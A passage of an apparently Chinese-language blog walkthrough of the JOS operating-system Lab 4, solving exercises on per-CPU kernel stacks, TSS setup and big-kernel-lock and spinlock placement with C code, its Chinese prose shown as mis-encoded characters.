ˆï¼Œä¸”åº”ç¡®ä¿å…¶å †æ ˆå ç”¨ä¸€å—è¿ç»­çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸ</p></li><li><p><strong>Per-CPU TSS and TSS descriptor</strong>.</p><p>æˆ‘ä»¬åŒæ ·éœ€è¦ä¸€ä¸ª per-CPU ä»»åŠ¡çŠ¶æ€æ®µæ¥ç¡®å®šæ¯ä¸ª CPU çš„å†…æ ¸æ ˆçš„ä½ç½®ï¼Œæ¯ä¸ª CPU çš„ TSS è¢«å­˜æ”¾åœ¨ <code>cpus[i].cpu_ts</code> ä¸­ï¼Œå¯¹åº”çš„ TSS descriptor åˆ™åœ¨ <code>gdt[(GD_TSS0) &gt;&gt; 3] + i]</code> ï¼Œå®šä¹‰äº <code>kern/trap.c</code> ä¸­çš„å…¨å±€å˜é‡ <code>ts</code> åˆ™ä¸å†ä½¿ç”¨</p></li><li><p><strong>Per-CPU current environment pointer</strong>.</p><p>å› ä¸ºæ¯ä¸ª CPU éƒ½å¯ä»¥ç‹¬ç«‹è¿è¡Œç”¨æˆ·è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬å°†ç¬¦å· <code>curenv</code> é‡å®šä¹‰ä¸º <code>cpus[cpunum()].cpu_env</code> ï¼ŒæŒ‡å‘è¿è¡Œåœ¨å½“å‰ CPU ä¸Šè¿›ç¨‹çš„ PCB</p></li><li><p><strong>Per-CPU system registers</strong>.</p><p>æ‰€æœ‰çš„å¯„å­˜å™¨å¯¹ä¸€ä¸ª CPU è€Œè¨€éƒ½æ˜¯ç§æœ‰çš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦åœ¨æ¯ä¸ª CPU ä¸Šéƒ½åˆå§‹åŒ–å…¶ cr3ã€gdtã€idtâ€¦</p></li></ul><p>æ¥ä¸‹æ¥æ˜¯ Exercise 3ï¼Œä¿®æ”¹ <code>mem_init_mp()</code> ä»¥ä¸ºæ¯ä¸ª CPU åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ</p><blockquote><p><strong>Exercise 3.</strong> Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code>.</p></blockquote><p>ç›´æ¥ç”¨ <code>boot_map_region</code> åˆ›å»ºæ˜ å°„å³å¯ï¼Œæ³¨æ„è¿™é‡Œä¸ç®¡æˆ‘ä»¬æœ‰å¤šå°‘ä¸ª CPU éƒ½è¦å»ºç«‹ <code>NCPU</code> ä¸ªå†…æ ¸æ ˆï¼ˆè¿™ä¸ªæ—¶å€™ <code>ncpu</code> å˜é‡è¿˜æ²¡åˆå§‹åŒ–ï¼Œè€Œä¸”æ•´ä¸ª <code>percpu_kstack</code> æ•°ç»„çš„å¤§å°æ˜¯åœ¨ç¼–è¯‘æœŸç¡®å®šçš„ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Modify mappings in kern_pgdir to support SMP</span></span><br><span class="line"><span class="comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init_mp</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span></span><br><span class="line"><span class="comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span></span><br><span class="line"><span class="comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span></span><br><span class="line"><span class="comment">// divided into two pieces, just like the single stack you set up in</span></span><br><span class="line"><span class="comment">// mem_init:</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span></span><br><span class="line"><span class="comment">//          -- backed by physical memory</span></span><br><span class="line"><span class="comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span></span><br><span class="line"><span class="comment">//          -- not backed; so if the kernel overflows its stack,</span></span><br><span class="line"><span class="comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span></span><br><span class="line"><span class="comment">//             Known as a &quot;guard page&quot;.</span></span><br><span class="line"><span class="comment">//     Permissions: kernel RW, user NONE</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NCPU; i++)</span><br><span class="line">&#123;</span><br><span class="line">boot_map_region(kern_pgdir, </span><br><span class="line">KSTACKTOP - i * (KSTKSIZE + KSTKGAP) - KSTKSIZE, </span><br><span class="line">KSTKSIZE, </span><br><span class="line">PADDR(&amp;percpu_kstacks[i]), </span><br><span class="line">PTE_W);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ Exercise 4ï¼Œæ›´æ”¹ <code>trap_init_percpu()</code> ä»¥è®©å…¶èƒ½æ­£å¸¸åœ¨æ‰€æœ‰ CPU ä¸Šè¿è¡Œ</p><blockquote><p><strong>Exercise 4.</strong> The code in <code>trap_init_percpu()</code> (<code>kern/trap.c</code>) initializes the TSS and TSS descriptor for the BSP. It worked in Lab 3, but is incorrect when running on other CPUs. Change the code so that it can work on all CPUs. (Note: your new code should not use the global <code>ts</code> variable any more.)</p></blockquote><p>ä¸»è¦å°±æ˜¯æŠŠå…¨å±€å˜é‡ <code>ts</code> æ›¿æ¢æˆ <code>thiscpu</code> æŒ‡å‘çš„ <code>CpuInfo</code> ç»“æ„ä½“çš„ <code>cpu_ts</code> æˆå‘˜å³å¯ï¼Œä»¥åŠä¿®æ”¹å…¨å±€æ®µæè¿°ç¬¦è¡¨ä¸­å¯¹åº”æ®µæè¿°ç¬¦ä¸º tss æè¿°ç¬¦æ—¶æ³¨æ„ä½¿ç”¨ <code>cpunum()</code> æ¥è·å–å½“å‰ CPU çš„æ ‡å·ï¼Œè¿˜æœ‰å°±æ˜¯æ³¨æ„å°† tss çš„ esp åˆå§‹åŒ–ä¸ºå¯¹åº” cpu çš„æ ˆï¼Œè¿™é‡Œè¿˜è¦æ³¨æ„ä¸€ç‚¹å°±æ˜¯ <code>ltr</code> æŒ‡ä»¤æ‰€ç”¨çš„å€¼åº”ä¸º <em>å¯¹åº”çš„æè¿°ç¬¦åœ¨å…¨å±€æè¿°ç¬¦è¡¨ä¸­çš„åç§»</em> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize and load the per-CPU TSS and IDT</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap_init_percpu</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The example code here sets up the Task State Segment (TSS) and</span></span><br><span class="line"><span class="comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span></span><br><span class="line"><span class="comment">// running on other CPUs because each CPU has its own kernel stack.</span></span><br><span class="line"><span class="comment">// Fix the code so that it works for all CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span></span><br><span class="line"><span class="comment">//     struct CpuInfo;</span></span><br><span class="line"><span class="comment">//   - The ID of the current CPU is given by cpunum() or</span></span><br><span class="line"><span class="comment">//     thiscpu-&gt;cpu_id;</span></span><br><span class="line"><span class="comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span></span><br><span class="line"><span class="comment">//     rather than the global &quot;ts&quot; variable;</span></span><br><span class="line"><span class="comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span></span><br><span class="line"><span class="comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span></span><br><span class="line"><span class="comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span></span><br><span class="line"><span class="comment">//     from doing IO (0 is not the correct value!)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span></span><br><span class="line"><span class="comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span></span><br><span class="line"><span class="comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span></span><br><span class="line"><span class="comment">// wrong, you may not get a fault until you try to return from</span></span><br><span class="line"><span class="comment">// user space on that CPU.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup a TSS so that we get the right stack</span></span><br><span class="line"><span class="comment">// when we trap to the kernel.</span></span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - (KSTKSIZE + KSTKGAP) * cpunum();</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize the TSS slot of the gdt.</span></span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="type">uint32_t</span>) (&amp;thiscpu-&gt;cpu_ts),</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> Taskstate) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>) + cpunum()].sd_s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the TSS selector (like other segment selectors, the</span></span><br><span class="line"><span class="comment">// bottom three bits are special; we leave them 0)</span></span><br><span class="line">ltr(GD_TSS0 + (cpunum() * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Segdesc)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the IDT</span></span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œ <code>make qemu CPUS=4</code>ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å‡ ä¸ªå¤„ç†å™¨éƒ½æˆåŠŸåœ°å¯åŠ¨äº†ï¼š</p><p><img src="https://s2.loli.net/2022/03/21/VvEiuky4DseIRTq.png" alt="image.png"></p><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><p>ä¼´éšç€å¤šå¤„ç†å™¨ç³»ç»Ÿçš„å‡ºç°ï¼Œ <em>æ¡ä»¶ç«äº‰</em> ï¼ˆrace conditionï¼‰æˆä¸ºäº†æˆ‘ä»¬ä¸å¾—ä¸è€ƒè™‘çš„ä¸€ä¸ªé—®é¢˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ <code>é”</code> æ¥ä¿æŠ¤ä¸´ç•ŒåŒºä¸­çš„æ•°æ®ï¼Œåœ¨åŒä¸€æ—¶é—´æ®µåªæœ‰ä¸€ä¸ª CPU å¯ä»¥æ”¹å˜ä¸´ç•ŒåŒºå†…çš„æ•°æ®ï¼Œæ¯”è¾ƒæœ´ç´ çš„ä¸€ä¸ªåŠæ³•å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªå…¨å±€çš„ <em>big kernel lock</em> ï¼Œå½“ç”¨æˆ·è¿›ç¨‹è¿›å…¥å†…æ ¸æ€æ—¶ä¸Šé”ï¼Œé€€å‡ºåå†è§£é”ï¼Œè¿™æ ·åœ¨åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹å¯ä»¥è¿è¡Œåœ¨å†…æ ¸æ€ï¼Œç¡®ä¿äº†å†…æ ¸æ•°æ®çš„å®‰å…¨</p><p>åœ¨ <code>kern/spinlock.h</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªå¤§çš„å†…æ ¸é” <code>kernel_lock</code>ï¼ŒåŒæ—¶æä¾›äº†åŠ é”ä¸è§£é”çš„å‡½æ•° <code>lock_kernel()</code> å’Œ <code>unlock_kernel()</code>ï¼Œæˆ‘ä»¬åº”å½“åœ¨ä»¥ä¸‹å››ä¸ªåœ°æ–¹ä½¿ç”¨å¤§å†…æ ¸é”ï¼š</p><ul><li>åœ¨ BSP å”¤é†’ APs å‰è¯·æ±‚é”ï¼ˆ<code>i386_init()</code>ï¼‰</li><li>åœ¨åˆå§‹åŒ–å½“å‰ AP åè¯·æ±‚é”ï¼ˆ<code>mp_main()</code>ï¼‰ï¼Œä¹‹åè°ƒç”¨ <code>sched_yield()</code> ä»¥åœ¨è¯¥ AP ä¸Šè¿è¡Œç”¨æˆ·è¿›ç¨‹</li><li>åœ¨ä»ç”¨æˆ·æ€é™·å…¥å†…æ ¸æ€æ—¶è¯·æ±‚é”ï¼ˆ<code>trap()</code>ï¼‰ï¼Œä¸ºäº†ç¡®å®šé™·é˜±å‘ç”Ÿåœ¨ç”¨æˆ·æ€è¿˜æ˜¯å†…æ ¸æ€ï¼Œæˆ‘ä»¬åº”å½“æ£€æŸ¥ <code>tf_cs</code> çš„ RPL</li><li>åœ¨ä»å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€ä¹‹å‰é‡Šæ”¾é”ï¼ˆ<code>env_run()</code>ï¼‰ï¼Œä¸è¦è¿‡æ—©æˆ–è¿‡æ™šï¼Œå¦åˆ™å¯èƒ½ä¼šé€ æˆç«æ€æˆ–æ­»é”</li></ul><p>äºæ˜¯æ¥ä¸‹æ¥å°±æ˜¯ Exercise 5ï¼šåœ¨ä¸Šè¿°ä½ç½®è¡¥å……ç›¸åº”çš„é”</p><blockquote><p><strong>Exercise 5.</strong> Apply the big kernel lock as described above, by calling <code>lock_kernel()</code> and <code>unlock_kernel()</code> at the proper locations.</p></blockquote><p>åœ¨ JOS ä¸­ï¼Œä¸€ä¸ªè‡ªæ—‹é”èµ·å…¶å®è¢«å®šä¹‰ä¸ºä¸€ä¸ªæ™®é€šçš„æ•´å‹å˜é‡ï¼Œ<strong>ä½†æ˜¯ä¸Šé”ä¸è§£é”çš„æ“ä½œæ˜¯é€šè¿‡åŸå­æŒ‡ä»¤å®Œæˆçš„</strong>ï¼Œè€ŒåŸå­æŒ‡ä»¤çš„å®ç°<strong>å…¶å®æ˜¯é€šè¿‡ <code>lock</code> å‰ç¼€å®Œæˆçš„</strong>ï¼Œè¢«è¯¥å‰ç¼€ä¿®é¥°çš„æŒ‡ä»¤åœ¨è®¿é—®å†…å­˜æ—¶åŒæ—¶ä¼šå®Œæˆå¯¹æ€»çº¿çš„æ§åˆ¶ï¼Œç›´åˆ°æŒ‡ä»¤ç»“æŸï¼Œä»è€Œ<strong>ä»ç¡¬ä»¶å±‚é¢ä¿è¯äº†æŒ‡ä»¤çš„åŸå­æ€§</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="type">uint32_t</span> *addr, <span class="type">uint32_t</span> newval)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span></span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lock; xchgl %0, %1&quot;</span></span></span><br><span class="line"><span class="params">     : <span class="string">&quot;+m&quot;</span> (*addr), <span class="string">&quot;=a&quot;</span> (result)</span></span><br><span class="line"><span class="params">     : <span class="string">&quot;1&quot;</span> (newval)</span></span><br><span class="line"><span class="params">     : <span class="string">&quot;cc&quot;</span>)</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç°åœ¨ä½ çŸ¥é“ä¸€ä¸ªè‡ªæ—‹é”è¯¥æ€ä¹ˆå®ç°äº†å§ ï¼›ï¼‰é‚£ä¹ˆäº’æ–¥é”å‘¢ï¼Ÿäº’æ–¥é”çš„å®ç°å…¶å®éœ€è¦ä¾èµ–é¢å¤–çš„è¾…åŠ©ç»“æ„â€¦</p></blockquote><p>è¿™é‡Œ <code>lock_kernel()</code> å’Œ <code>unlock_kernel()</code>ç›´æ¥æ“ä½œçš„å°±æ˜¯å¤§å†…æ ¸é”ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†å…¶æ”¾ç½®åœ¨å¯¹åº”ä½ç½®å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">i386_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Acquire the big kernel lock before waking up APs</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line">lock_kernel();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Setup code for APs</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mp_main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// We are in high EIP now, safe to switch to kern_pgdir </span></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line">cprintf(<span class="string">&quot;SMP: CPU %d starting\n&quot;</span>, cpunum());</span><br><span class="line"></span><br><span class="line">lapic_init();</span><br><span class="line">env_init_percpu();</span><br><span class="line">trap_init_percpu();</span><br><span class="line">xchg(&amp;thiscpu-&gt;cpu_status, CPU_STARTED); <span class="comment">// tell boot_aps() we&#x27;re up</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Now that we have finished some basic setup, call sched_yield()</span></span><br><span class="line"><span class="comment">// to start running processes on this CPU.  But make sure that</span></span><br><span class="line"><span class="comment">// only one CPU can enter the scheduler at a time!</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Your code here:</span></span><br><span class="line">lock_kernel();</span><br><span class="line">    sched_yield();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove this after you finish Exercise 6</span></span><br><span class="line"><span class="keyword">for</span> (;;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">trap</span><span class="params">(<span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="comment">// Trapped from user mode.</span></span><br><span class="line"><span class="comment">// Acquire the big kernel lock before doing any</span></span><br><span class="line"><span class="comment">// serious kernel work.</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">assert(curenv);</span><br><span class="line">lock_kernel();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// recover the context of process and ret2usr</span></span><br><span class="line">    unlock_kernel();</span><br><span class="line">lcr3(PADDR(curenv-&gt;env_pgdir));</span><br><span class="line">env_pop_tf(&amp;curenv-&gt;env_tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// we never arrive there</span></span><br><span class="line">panic(<span class="string">&quot;env_run not yet implemented&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¹ é¢˜ timeï¼šä¸ºä»€ä¹ˆæœ‰äº†å¤§å†…æ ¸é”æˆ‘ä»¬è¿˜è¦ä¸ºæ¯ä¸ª CPU åˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„å†…æ ¸æ ˆï¼Ÿ</p><blockquote><p><strong>Question</strong></p><ol><li>It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock.</li></ol></blockquote><p>æˆ‘ä»¬åœ¨ä»ç”¨æˆ·æ€é™·å…¥åˆ°å†…æ ¸æ€å†åˆ°è·å–åˆ°é”ä¸­é—´ä»æœ‰ä¸€æ®µéœ€è¦å‹æ ˆçš„è¿‡ç¨‹ï¼Œå› æ­¤è‹¥å¤šä¸ªç”¨æˆ·è¿›ç¨‹åŒæ—¶é™·å…¥å†…æ ¸æ€åˆ™ä¼šç ´åæ‰å†…æ ¸æ ˆä¸Šä¿å­˜çš„å±äºå…¶ä»–ç”¨æˆ·è¿›ç¨‹çš„æ ˆå¸§</p><p>ä¹‹åæ˜¯ Challengeï¼Œä¸ºå››ä¸ªåœ°æ–¹åŠ ä¸Šé”ï¼š</p><blockquote><p><em>Challenge!</em> The big kernel lock is simple and easy to use. Nevertheless, it eliminates all concurrency in kernel mode. Most modern operating systems use different locks to protect different parts of their shared state, an approach called <em>fine-grained locking</em>. Fine-grained locking can increase performance significantly, but is more difficult to implement and error-prone. If you are brave enough, drop the big kernel lock and embrace concurrency in JOS!</p><p>It is up to you to decide the locking granularity (the amount of data that a lock protects). As a hint, you may consider using spin locks to ensure exclusive access to these shared components in the JOS kernel:</p><ul><li>The page allocator.</li><li>The console driver.</li><li>The scheduler.</li><li>The inter-process communication (IPC) state that you will implement in the part C.</li></ul></blockquote><p>ç¬¬å››ä¸ªåœ¨ part C æ‰å®ç°ï¼Œæˆ‘ä»¬å…ˆçœ‹å‰ä¸‰ä¸ª</p><p>é¦–å…ˆæ˜¯ page allocatorï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜ä¸€ä¸ªå…¨å±€çš„é”å˜é‡ï¼Œåœ¨ <code>page_init()</code> ä¸­å¯¹å…¶åˆå§‹åŒ–ï¼Œå¹¶åœ¨ <code>page_alloc()</code> ä¸ <code>page_free()</code> ä¸­éƒ½åŠ å…¥å¯¹è¯¥é”çš„ä½¿ç”¨ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°å†æ·»åŠ ä¸€å±‚ wrapper æ¥ä½¿ç”¨é”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// spinlock for page allocator</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">page_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 6) init page_lock</span></span><br><span class="line">__spin_initlock(&amp;page_lock, <span class="string">&quot;page allocator lock&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *</span></span><br><span class="line"><span class="class">__<span class="title">page_alloc</span>(<span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> PageInfo *</span><br><span class="line"><span class="title function_">page_alloc</span><span class="params">(<span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">res</span>;</span></span><br><span class="line"></span><br><span class="line">spin_lock(&amp;page_lock);</span><br><span class="line">res = __page_alloc(alloc_flags);</span><br><span class="line">spin_unlock(&amp;page_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span 